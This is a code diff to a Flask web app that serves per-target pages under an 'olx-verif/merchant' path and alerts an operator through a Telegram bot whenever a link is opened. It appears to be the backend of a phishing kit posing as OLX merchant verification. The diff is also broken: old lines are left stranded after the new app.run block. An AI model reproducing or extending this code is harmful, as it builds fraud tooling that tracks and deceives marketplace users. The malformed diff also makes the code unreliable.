@@ -12,7 +12,10 @@ CHAT_ID = '6958729639'
 def send_telegram_message(chat_id, text):
     url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
     payload = {'chat_id': chat_id, 'text': text}
-    requests.post(url, data=payload)
+    response = requests.post(url, data=payload)
+    if response.status_code != 200:
+        print(f"Failed to send message: {response.text}")
+    return response
 
 @app.route('/verif/<random_id>', methods=['POST'])
 def save_page(random_id):
@@ -76,6 +79,12 @@ def save_page(random_id):
 def serve_merchant_page(random_id):
     merchant_path = f"/var/www/olx-verif/merchant/{random_id}"
     # Send a message to the user when they visit the link
+    response = send_telegram_message(CHAT_ID, f"Переход по ссылке {random_id}")
+    print(f"Message send response: {response.text}")
+    return send_from_directory(merchant_path, 'index.html')
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
     send_telegram_message(CHAT_ID, f"Переход по ссылке {random_id}")
     return send_from_directory(merchant_path, 'index.html')
 
